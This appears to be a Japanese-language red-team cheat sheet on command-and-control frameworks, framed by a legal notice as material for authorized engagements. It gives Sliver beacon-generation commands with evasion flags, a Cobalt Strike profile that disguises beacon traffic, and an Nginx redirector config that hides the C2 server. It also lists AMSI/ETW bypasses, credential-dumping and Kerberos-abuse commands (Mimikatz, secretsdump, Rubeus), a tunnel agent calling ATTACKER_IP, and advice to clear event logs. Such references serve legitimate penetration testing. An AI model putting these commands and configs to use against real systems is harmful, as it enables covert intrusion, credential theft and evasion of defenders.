# プロフェッショナル向け C2 フレームワーク完全チートシート

## はじめに

Command and Control（C2）フレームワークは、あらゆるポストエクスプロイト運用の基盤です。C2 は、アクセス維持、横展開、目的達成に必要なインフラ、 tradecraft、柔軟性を提供します。本チートシートは、プロのレッドチーマー向けの総合運用リファレンスであり、基本概念、フレームワーク比較、コマンドリファレンス、OPSEC ベストプラクティス、必須ツールを網羅します。

> ** 法的・倫理的通知:** ここに記載された技術は、許可されたレッドチーム演習、ペネトレーションテスト、セキュリティ研究のみを目的としています。未許可のシステムアクセスは違法かつ非倫理的です。常に署名済みの許可書の範囲内で、明示的な終了日をもって運用してください。


## 1. 基本概念（Core Concepts）

どのフレームワークに触れる前にも、以下の基本概念を完全に理解する必要があります。これらは運用上のあらゆる判断を左右します。

| 概念 | 説明 |
|---|---|
| **Beacon / Implant** | 被害者システム上で実行され、定期的に C2 サーバへチェックインするプログラム。オペレータのターゲット環境内での存在そのもの。 |
| **Session vs. Beacon** | **Session** はリアルタイムの対話型接続（SSH に類似）。低遅延・高対話性だがノイズが多い。**Beacon** は非同期・定期コールバック。ステルス性が高いが、タスク間に本質的な遅延がある。 |
| **Sleep Interval** | 各ビーコンが C2 サーバへチェックインする基本間隔。秒または分で測定。長いほどステルスだが応答は遅い。 |
| **Jitter** | sleep interval に適用されるランダム化率。例えば 60 秒 sleep + 30% jitter なら、42〜78 秒の間でランダムにチェックインする。間隔ベースの検知を無効化する。 |
| **Callback** | ビーコンが初めて C2 サーバへ接続した瞬間。ターゲット上での実行確認。 |
| **Redirector** | ビーコンと実際の teamserver の間でトラフィックを転送する中間サーバ（多くの場合、安価な VPS）。真の C2 IP を隠し、悪性トラフィックをフィルタできる。 |
| **Malleable C2 Profile** | ビーコンのネットワークトラフィックを正当なアプリケーション通信（例: Microsoft Update、JSON API コール）に似せる設定ファイル。URI、ヘッダ、User-Agent、データエンコーディングを制御する。 |
| **OPSEC** | Operational Security。SOC アナリスト、EDR、NDR などの防御層による検知可能性を下げる実践群。 |


## 2. C2 フレームワーク比較

適切なフレームワークの選択は、エンゲージメントの範囲、ターゲット環境、予算、ステルス要件に依存する戦略的判断です。

| フレームワーク | 言語 | プロトコル | ライセンス | 主な用途 | 強み | 弱み |
|---|---|---|---|---|---|---|
| **Cobalt Strike** | Java / C | HTTP/S, DNS, SMB, TCP | 商用（高額） | 業界標準のレッドチーミング、ポストエクスプロイト | 成熟したエコシステム、積極的な難読化、sleep masking、malleable profiles、豊富な BOF サポート | 強くシグネチャ化されている、高額、安全な設定には専門知識が必要 |
| **Sliver** | Go | mTLS, HTTP(S), DNS, WireGuard | オープンソース | クロスプラットフォーム、Linux 中心、トレーニング | モダン、活発、マルチプレイヤー、Linux サポートが強い、mTLS、WireGuard | CS よりプラグインエコシステムが小さい、デフォルトプロファイルは EDR に知られている、OPSEC 問題あり |
| **Mythic** | Python（コア）、各種エージェント | エージェント依存（HTTP/S、TCP など） | オープンソース | モジュラーエージェント開発、長期運用、トレーニング | 高度にモジュラー、ターゲット別エージェント選択、Docker ネイティブ、強力な Web UI、Apollo/Athena/Poseidon などをサポート | 学習曲線が急、エージェント品質のばらつきが大きい |
| **Havoc** | C/C++/Go | HTTP/S, SMB | オープンソース | 高度なレッドチーミング、EDR バイパス | モダンなコードベース、比較的低検知、UAC bypass、reflective DLL injection | コミュニティが小さい、CS より未成熟 |
| **Metasploit** | Ruby | 複数 | オープンソース | ペネトレーションテスト、エクスプロイト、トレーニング | 巨大なエクスプロイト DB、多用途、初期アクセスに優れる | ステルスなレッドチーミング向けではない、EDR に検知されやすい |

### フレームワーク選択ガイド

| シナリオ | 推奨フレームワーク | 理由 |
|---|---|---|
| **ステルスなレッドチーム運用** | Cobalt Strike, Havoc | 高度な回避、sleep masking、malleable profiles を提供。 |
| **クロスプラットフォーム（Windows + Linux）** | Sliver, Mythic | Sliver の Go インプラントは複数 OS にコンパイル可能。Mythic は多様なエージェントをサポート。 |
| **カスタムエージェント開発** | Mythic, Sliver | Mythic のモジュラー構造はカスタムエージェント向け。Sliver は拡張をサポート。 |
| **予算制約のあるエンゲージメント** | Sliver, Mythic, Havoc | すべて無料かつオープンソース。 |
| **トレーニング / ラボ環境** | Metasploit, Mythic | Metasploit は初心者向け。Mythic はモジュラー C2 アーキテクチャを学べる。 |
| **Windows 中心の AD 環境** | Cobalt Strike, Empire（フォーク） | 深い Windows/AD 統合、成熟したツール群。 |

## 5. Sliver — コマンドリファレンス

Sliver は Bishop Fox が開発した、モダンでオープンソースの Go ベース C2 フレームワークです。mTLS、HTTP(S)、DNS、WireGuard トランスポートをサポートし、Session と Beacon の両インプラントタイプを持ちます。

### 5.1 ペイロード生成

```bash
# 基本的な Windows ビーコン（mTLS）
generate beacon --mtls 10.10.10.10:8888 --os windows --arch amd64 --format exe --save /tmp/beacon.exe

# sleep と jitter 設定付き
generate beacon --mtls 10.10.10.10:8888 --os windows --arch amd64 --seconds 60 --jitter 30

# HTTP 経由の Linux インプラント
generate --http 10.10.10.10:80 --os linux --arch amd64 --format elf --save /tmp/implant

# 回避機能付き
generate beacon --mtls 10.10.10.10:8888 --os windows --arch amd64 --evasion --skip-symbols
```

## 6. OPSEC ベストプラクティス

このセクションが、プロのオペレータと初心者を分ける部分です。検知は *いつか* 起こるものであり、*起こるかどうか* ではありません。あなたの仕事は可能な限り遅らせることです。

### 6.1 Sleep & Jitter 戦略

| シナリオ | Interval | Jitter | 理由 |
|---|---|---|---|
| **ラボ / トレーニング** | 0s | 0% | 最大速度。**実際のエンゲージメントでは絶対に使用しない。** |
| **標準レッドチーム** | 5m | 30% | ステルスと運用制御のバランス。 |
| **APT 級ステルス** | 1–24h | 50% | 最大ステルス。長期永続化に適する。 |
| **特権昇格後** | 1m | 20% | 昇格中はより速い応答が必要。 |

> ** 重要な原則:** 毎秒チェックインするビーコンは、実質的に遭難信号です。現代の SOC や EDR は、高頻度で規則的なコールバックを数分以内に検知します。常に jitter を使い、現実的な sleep 間隔を設定してください。

### 6.2 プロトコル選択

| プロトコル | 利点 | 欠点 |
|---|---|---|
| **mTLS** | 強力な相互認証。ラボや内部ピボットに適する。 | 珍しいトラフィックパターン。証明書管理が必要。egress フィルタでブロックされる可能性。 |
| **HTTP(S)** | 通常の Web トラフィックに混ざる。ほとんどの egress フィルタを通過。 | Deep Packet Inspection（DPI）に弱い。malleable profile が必須。 |
| **DNS** | egress フィルタで許可されやすい。HTTP がブロックされた時に有用。 | 遅い。低帯域。DNS 監視で検知されやすい。 |
| **WireGuard**（Sliver） | モダン、高速、暗号化。HTTP より監視が少ない。 | UDP egress が必要。常に利用可能とは限らない。 |

### 6.3 Malleable C2 Profile

Malleable C2 profile を使うと、ビーコンのトラフィックを正当なアプリケーションに似せられます。HTTP(S) ビーコンではこれは必須です。

**例: Cobalt Strike Malleable Profile（一般的な CDN テレメトリ風）**

```
set sleeptime "5000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/api/v1/telemetry/heartbeat";
    client {
        header "Accept" "application/json";
        metadata {
            base64;
            prepend "session=";
        }
    }
    server {
        output {
            base64;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
        }
    }
}

http-post {
    set uri "/api/v1/telemetry/report";
    client {
        header "Content-Type" "application/json";
        id {
            base64;
            prepend "id=";
        }
        output {
            base64;
            prepend "{\"payload\":\"";
            append "\"}";
        }
    }
}
```

**プロファイルのベストプラクティス:**
- 現実的で疑われにくい URI を使う（例: `/api/v1/updates`、`/static/js/app.js`）。
- ターゲット環境で一般的なブラウザやアプリの User-Agent に合わせる。
- metadata と output を base64 またはカスタムエンコーディングでエンコードする。
- `sleeptime` と `jitter` を現実的な値にする（例: 5〜15 分、20〜40% jitter）。
- 展開前に `c2lint`（Cobalt Strike）などでプロファイルをテストする。

### 6.4 Redirector & Domain Fronting インフラ

**teamserver の実 IP を絶対に露出させない。** 多層インフラを使います。

1. **Redirector（VPS）:** Nginx や Apache を動かす安価な VPS。malleable profile に一致するトラフィックだけを teamserver へ転送し、それ以外は破棄する。
2. **Domain Fronting:** TLS SNI と HTTP Host ヘッダの不一致を悪用。ネットワーク監視者には高評価ドメイン（例: `cdn.microsoft.com`）への接続に見えるが、CDN が内部 Host ヘッダに基づいてあなたのオリジンへルーティングする。
3. **TLS 証明書:** redirector のドメインには Let's Encrypt または正規 CA 発行の証明書を使う。自己署名証明書は即座にレッドフラグ。
4. **ドメイン年齢:** 「新規登録ドメイン」フラグを避けるため、ある程度登録から時間が経った aged domain を使う。

**Nginx Redirector 設定例（概念）:**

```nginx
server {
    listen 443 ssl;
    server_name cdn.yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/cdn.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.yourdomain.com/privkey.pem;

    # malleable profile の特定 User-Agent を持つトラフィックのみ転送
    if ($http_user_agent !~ "SpecificBeaconUA") {
        return 302 https://www.google.com;
    }

    location /api/v1/telemetry/ {
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_ssl_verify off;
    }

    # それ以外はすべてドロップ
    location / {
        return 404;
    }
}
```

### 6.5 ペイロード回避（Payload Evasion）技術

| 技術 | 説明 | フレームワーク対応 |
|---|---|---|
| **In-Memory Execution** | ディスクに書き込まずアセンブリや shellcode を実行。 | CS: `execute-assembly`, `shspawn`; Mythic: `execute_assembly`, `execute_pe`; Sliver: `execute-assembly` |
| **Direct Syscalls** | user-mode フックを回避し、syscall を直接呼び出す。 | カスタム BOF / エージェント。Havoc はネイティブ対応。 |
| **Thread Stack Spoofing** | EDR のメモリスキャナからコールスタックを隠す。 | 高度なカスタムエージェント。一部の Havoc / CS 構成。 |
| **Sleep Masking** | sleep 中にビーコンメモリを暗号化し、EDR のスキャンを防ぐ。 | Cobalt Strike（malleable profiles + sleep mask）。一部の Mythic エージェント。 |
| **AMSI Bypass** | PowerShell 実行前に Antimalware Scan Interface を無効化。 | CS: AMSI bypass 付き `powershell-import`; Sliver: `--amsi-bypass`; Mythic: エージェント依存。 |
| **ETW Bypass** | Event Tracing for Windows を無効化しテレメトリを盲目化。 | Sliver: `--etw-bypass`; 高度なエージェント。 |

### 6.6 クリーンアップ（Cleanup）

- ターゲットからアップロードしたファイルやツールを削除する。
- 関連するイベントログ（Security、System、PowerShell など）を消去する。
- エンゲージメント範囲が要求する場合、永続化機構を削除する。
- **ステルス性の高いバイナリを VirusTotal にアップロードしない。** ローカル解析かプライベートサンドボックスを使う。

> **Burn Condition:** すべてのインプラント設定には、エンゲージメント終了日に関連付けられた kill-switch またはハード有効期限を含める必要があります。エンゲージメントを超えて生き残るインプラントは範囲外であり、法的・運用リスクを生みます。


## 7. C2 運用のための必須ツールキット

これらのツールは C2 フレームワークを補完し、プロのレッドチーミングに不可欠です。

### 7.1 Active Directory 列挙 & 攻撃パス分析

| ツール | 目的 | 主要コマンド | 使用タイミング |
|---|---|---|---|
| **SharpHound / BloodHound** | AD 関係をマップし、Domain Admin への攻撃パスを発見。 | `SharpHound.exe -c All --zipfilename bloodhound_data.zip` | 初期ドメインアクセス後。横展開パス特定に必須。 |
| **BloodHound-Python** | BloodHound 用の Linux ベース AD 列挙。 | `bloodhound-python -u user -p pass -d domain -ns DC_IP -c all --zip -o bloodhound/` | Linux から操作し BloodHound データが必要な時。 |
| **Certipy** | AD Certificate Services（AD CS）脆弱性（ESC1–ESC8）の列挙と悪用。 | `certipy find -u user@domain -p pass -dc-ip DC_IP -stdout`; `certipy req -u user@domain -p pass -ca CA -template ESC1 -upn administrator@domain` | AD CS が存在する時。特権昇格に非常に有効。 |
| **Rubeus** | Kerberos 悪用（Kerberoasting、AS-REP、Pass-the-Ticket）。 | `Rubeus.exe kerberoast /outfile:hashes.txt`; `Rubeus.exe ptt /ticket:ticket.kirbi` | 資格情報アクセスと横展開フェーズ。 |
| **Impacket**（Kali） | SMB、WMI、MSSQL などの Python スイート。 | `impacket-secretsdump domain/user:pass@DC_IP`; `impacket-psexec domain/user:pass@target` | クロスプラットフォームでスクリプト可能な横展開と資格情報ダンプ。 |
| **NetExec (nxc)** | SMB/WinRM/MSSQL/SSH の大規模検証と実行。 | `nxc smb 192.168.1.0/24 -u user -p pass -x whoami`; `nxc winrm target -u user -H hash -x whoami` | 大規模ターゲット検証と横展開。 |
| **Mimikatz** | LSASS からの資格情報抽出、Kerberos チケット操作。 | `sekurlsa::logonpasswords`; `kerberos::golden` | ポストエクスプロイトの資格情報アクセス。 |
| **StandIn** | マシンアカウント作成、ADCS テンプレート操作、ACL 悪用。 | `StandIn.exe --computer EvilComputer --make`; `StandIn.exe --adcs --template Machine` | ターゲットに触れず AD オブジェクトを操作したい時。 |
| **PrintSpoofer / GodPotato** | Windows で SeImpersonate → SYSTEM 昇格。 | `PrintSpoofer.exe -i -c cmd.exe`; `GodPotato.exe -cmd "cmd /c whoami"` | SeImpersonatePrivilege を持つサービスアカウントがある時。 |

### 7.2 ピボット & トンネリング

| ツール | 目的 | 主要コマンド | 使用タイミング |
|---|---|---|---|
| **Chisel** | HTTP 上の TCP/UDP トンネリング。SOCKS プロキシ。 | Server: `chisel server -p 8080 --reverse`; Client: `chisel client server:8080 R:socks` | 侵害ホスト経由の軽量 SOCKS プロキシが必要な時。 |
| **Ligolo-ng** | TUN インターフェースベースの透過ルーティング。SOCKS オーバーヘッドなし。 | `sudo ip tuntap add user $USER mode tun ligolo`; `sudo ip link set ligolo up`; `./proxy -selfcert`; Agent: `./agent -connect ATTACKER_IP:11601 -ignore-cert` | 複雑なピボットに最適。proxychains なしでネイティブルーティングを提供。 |
| **proxychains** | SOCKS プロキシ経由でツールトラフィックをルーティング。 | `proxychains nmap -sT -Pn target` | Chisel/SSH SOCKS プロキシの補完。 |
| **socat** | TCP/UDP ポートのリレーと転送。 | `socat TCP-LISTEN:8080,fork TCP:target:80` | 単純なポートフォワードとリレー。 |

### 7.3 ツール選択ガイド

| 運用上の必要性 | 推奨ツール | 理由 |
|---|---|---|
| **AD 攻撃パスのマップ** | BloodHound + SharpHound | AD 関係の可視化グラフ。Domain Admin への最短パスを特定。 |
| **AD CS の悪用** | Certipy | AD CS の総合的な列挙と悪用（ESC1–ESC8）。 |
| **Kerberoasting / AS-REP** | Rubeus, Impacket | Windows ネイティブなら Rubeus。Linux ベースなら Impacket。 |
| **資格情報ダンプ** | Mimikatz, Impacket secretsdump | LSASS には Mimikatz。リモートレジストリ/SAM には secretsdump。 |
| **大規模横展開** | NetExec, Impacket | 検証とスプレーには NetExec。精密な実行には Impacket。 |
| **ホスト経由のピボット** | Ligolo-ng, Chisel | 透過ルーティングには Ligolo-ng。軽量 SOCKS には Chisel。 |
| **SYSTEM への昇格** | PrintSpoofer, GodPotato | Windows での信頼性の高い SeImpersonate 悪用。 |

## 9. 本番運用前チェックリスト

実際のエンゲージメントでビーコンを展開する前に、以下を確認してください。

- [ ] **許可:** C2 使用、範囲、終了日が明記された署名済み文書。
- [ ] **Kill-switch:** インプラント設定に有効期限または burn condition が含まれている。
- [ ] **Redirector:** 少なくとも 1 つの redirector が配置され、teamserver IP が露出していない。
- [ ] **TLS 証明書:** redirector 上に有効な CA 発行証明書がある。
- [ ] **Malleable Profile:** HTTP(S) トラフィックが正当な通信に似せられている。
- [ ] **Sleep/Jitter:** 現実的な sleep 間隔と jitter（≥30%）が設定されている。
- [ ] **OPSEC レビュー:** 対応している場合、sleep mask、AMSI bypass、ETW bypass が有効。
- [ ] **検知ペアリング:** ブルーチーム向けの検知ノート（Sigma/Sysmon/Zeek）が準備されている。
- [ ] **ドキュメント:** すべての dial（sleep、jitter、URI、redirector path、burn condition）が記録されている。
- [ ] **クリーンアップ計画:** エンゲージメント終了時に成果物を削除しインプラントを終了する手順がある。
